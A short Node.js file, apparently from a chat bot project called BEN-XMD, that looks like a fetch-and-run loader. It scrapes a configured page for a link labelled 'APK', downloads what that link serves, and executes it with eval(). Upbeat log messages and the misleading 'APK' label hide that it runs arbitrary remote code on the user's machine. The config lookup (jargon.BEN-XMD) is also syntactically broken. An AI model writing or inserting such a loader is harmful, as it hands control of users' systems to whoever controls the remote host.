

//  [BEN-XMD TIMES]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Written by Ben                                    
//  >> Version: 4.1.3 ben

const axios = require('axios');
const cheerio = require('cheerio');
const jargon = require(__dirname + "/../config");

async function fetchAPKUrl() {
  try {
    const response = await axios.get(jargon.BEN-XMD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("APK")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('APK not found  😢');
    }

    console.log('APK loaded successfully  🥳');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchAPKUrl();
